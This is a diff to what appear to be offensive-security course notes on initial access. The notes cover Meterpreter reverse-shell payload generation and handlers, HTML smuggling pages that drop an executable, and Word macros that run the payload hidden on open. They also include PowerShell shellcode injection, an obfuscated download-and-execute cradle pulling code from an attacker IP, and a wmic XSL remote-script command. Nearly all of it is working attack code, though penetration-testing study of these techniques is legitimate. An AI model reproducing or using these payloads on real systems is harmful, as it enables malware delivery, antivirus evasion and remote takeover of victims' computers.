@@ -15,12 +15,22 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=44
 ```
 
 ```bash
-msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.50.1;set LPORT 443;run;"
+msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.119.120;set LPORT 443;run;"
 ```
 
 ## HTML Smuggling
 
 ### smuggling.html
+
+HTML5 anchor tag download attribute instructs the browser to automatically download a file when a user clicks the assigned hyperlink.
+
+```html
+<html>
+    <body>
+      <a href="/msfstaged.exe" download="msfstaged.exe">DownloadMe</a>
+   </body>
+</html>
+```
 
 ```html
 <html>
@@ -36,7 +46,6 @@ msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/rev
       		
 			/* msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o msfstaged.exe
 			base64 msfstaged.exe */
-			
       		var file ='TVqQAAMAAAAEAAAA...'
       		var data = base64ToArrayBuffer(file);
       		var blob = new Blob([data], {type: 'octet/stream'});
@@ -80,7 +89,7 @@ Sub MyMacro()
     exePath = ActiveDocument.Path + "\msfstaged.exe"
     Wait (2)
     Shell exePath, vbHide
-
+    'CreateObject("Wscript.Shell").Run str, 0
 End Sub
 
 Sub Wait(n As Long)
@@ -95,7 +104,7 @@ End Sub
 ## Phishing PreTexting
 
 1. With the text created, mark it and navigate to `Insert > Quick Parts > AutoTexts` and `Save Selection to AutoText Gallery`
-2. In the Create New Building Block dialog box, we'll enter the name "`TheDoc`"
+2. In the Create New Building Block dialog box, enter the name "TheDoc"
 
 ```VB
 Sub Document_Open()
@@ -184,8 +193,8 @@ public class Kernel32 {
 Add-Type $Kernel32
 
 [Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60...
-
 $size = $buf.Length
+
 [IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
 $thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
@@ -1294,10 +1303,14 @@ Perform a more complex obfuscation by converting the ASCII string to its decimal
 ```pwsh
 $payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
 
+$payload = "winmgmts:"
+
+$payload = "Win32_Process"
+
 [string]$output = ""
 
 $payload.ToCharArray() | %{
-    [string]$thischar = [byte][char]$_ + 17
+    [string]$thischar = [byte][char]$_ + 23
     if($thischar.Length -eq 1)
     {
         $thischar = [string]"00" + $thischar
@@ -1326,7 +1339,7 @@ Sub AutoOpen()
 End Sub
 
 Function Pears(Beets)
-    Pears = Chr(Beets - 17)
+    Pears = Chr(Beets - 23)
 End Function
 
 Function Strawberries(Grapes)
@@ -1351,7 +1364,7 @@ Function MyMacro()
     
     Apples = "<clipboard>"
     Water = Nuts(Apples)
-    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
+    GetObject(Nuts("<clipboard>")).Get(Nuts("<clipboard>")).Create Water, Tea, Coffee, Napkin
 End Function
 ```
 
@@ -1842,3 +1855,5 @@ xmlns:user="http://mycompany.com/mynamespace">
 ```bat
 wmic process get brief /format:"http://192.168.119.120/test.xsl"
 ```
+
+# Bypassing Network Filters
